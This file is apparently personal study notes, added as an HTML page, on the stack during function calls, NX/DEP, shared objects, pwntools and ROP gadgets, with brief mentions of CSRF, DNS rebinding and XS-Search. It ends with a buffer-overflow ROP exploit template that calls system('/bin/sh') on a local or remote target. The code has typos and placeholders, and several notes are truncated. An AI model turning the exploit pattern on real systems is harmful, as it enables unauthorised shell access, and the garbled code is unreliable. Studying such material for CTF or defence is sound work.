@@ -1,0 +1,96 @@
+<html>
+  <body><pre>
+    <code>
+      gzip -d aush_08f311931e81b109e10769690dbbf8eb.tar.gz
+========================================================
+When a function call is made, the stack is used to manage the execution flow and store relevant information. Here's an overview of how a function call relates to the stack:
+
+Function Prologue: Before making the function call, the caller function typically prepares the stack for the upcoming function call. This includes allocating space for local variables, saving the return address, and potentially preserving registers. The function prologue sets up the initial state on the stack.
+
+Parameter Passing: The caller function then passes any required function arguments to the called function. The specifics of parameter passing depend on the calling convention used by the programming language and the target architecture. Common approaches include passing arguments in registers, on the stack, or a combination of both.
+
+Stack Frame: When the function is called, a new frame, known as the stack frame or activation record, is created on the stack. The stack frame contains information specific to the called function, such as the return address, function parameters, local variables, and saved registers.
+
+Return Address: The return address, which is the address of the instruction to be executed after the called function completes, is typically pushed onto the stack as part of the function call. This return address points to the instruction in the caller function that should be executed next.
+
+Local Variables: The function may allocate space on the stack for its local variables. These variables are specific to the called function and are typically used for temporary storage or computation during its execution.
+
+Execution of the Called Function: The execution jumps to the called function, and it starts executing from its entry point. The function can access its parameters, local variables, and perform its intended operations.
+
+Function Epilogue: When the called function finishes executing, it performs the function epilogue to clean up the stack and prepare for the return to the caller function. This involves restoring the saved registers, popping the return address from the stack, and potentially deallocating the stack frame.
+
+Return to Caller: The return address is loaded into the instruction pointer (EIP/RIP) to resume execution in the caller function, and control is transferred back to the caller. The caller function continues its execution from the instruction following the function call.
+
+Throughout this process, the stack is used to manage the function call by storing relevant information such as return addresses, parameters, local variables, and stack frames. This stack-based organization facilitates the control flow and data management between functions during program execution.
+=========================================================================== 
+tar -xvzf file_name
+
+When a function is called, the value of the first argument is typically passed in rdi register.
+timing attack memcmp()
+headless chrome bot
+
+A headless browser is a browser without a graphical user interface. Instead of controlling the browser’s actions via its graphical user interface (GUI), headless browsers are controlled using the command line.
+dns rebinding attack	(by using options method)
+
+CORS (Cross-Origin Resource Sharing) preflight is a mechanism used by web browsers to determine if a cross-origin HTTP request (i.e., a request from one domain to another) is safe to send.
+->csrf attacks:
+csrf tokens,same site cookie,origin specification
+->xfrmae option 
+->side channel attack
+
+->Cross-site search (XS-Search) is an important attack principle in the family of XS-Leaks
+. This type of attack abuses Query-Based Search Systems to leak user information from an
+ attacker origin 1 2. The original attack uses timing measurements to detect whether or
+ not a search system returns results 
+browsers cache api
+so shared object file
+libc c library
+man 3 tool
+pwn cyclic
+dmesg
+checksec:
+this option is also referred to as Data Execution Prevention (DEP) or No-Execute (NX). When this
+ option is enabled, it works with the processor to help prevent buffer overflow attacks by blocking 
+code execution from memory that is marked as non-executab
+->he ldd command lists the path names of all dependencies.
+
+->ared object files (also known as dynamic link libraries or DLLs
+ on some platforms) can be executable. Shared object files in C 
+and C++ typically have a file extension of .so on Unix-like systems 
+(e.g., Linux) or .dll on Windows.
+->hared object files are a type of binary file that contains compiled 
+code and data that can be loaded and linked by multiple programs at 
+runtime. They provide a mechanism for sharing code and resources
+ among multiple executable files, enabling modularity and code reus
+->The ELF object from pwntools provides a symbols attribute,
+ which is a dictionary mapping symbol names to their addresses
+ in the ELF file
+->p64(value): This function takes a 64-bit integer value as input and returns its little-endian byte representation as a string of 8 bytes. The p64() function is commonly used for converting memory addresses or 64-bit integers into a byte string suitable for writing or transmitting data.
+-> gadget is a short sequence of instructions ending with a "ret" instruction, which allows control to be transferred to the next gadget in the chain. 
+->OPgadget scans a binary file for such gadgets and provides information about their addresses and instructions
+->rip(64bit)eop(32bit)
+----------------
+from pwn import *
+elf=ELF('.oursh file')
+p=elf.process()
+libc=elf('ldd used libc location') 
+or
+host='xyz.abc'
+port=xx
+p=remote(host,port)
+print(p.recvunitl('until what '))
+print(int(p.recv().strip(),16))
+bin_sh=libc.search('/bin/sh').next()
+ret=0x234543(needto find out)
+rop_chain=[pop_rdi,bin_sh,ret,system]
+rop_chain=''.join([p64(r) for i in ropchain)
+payload='a'*40+rop_chain
+p.sendline(payload)
+p.interactive()
+
+
+
+-
+    </code>
+  </pre></body>
+</html>
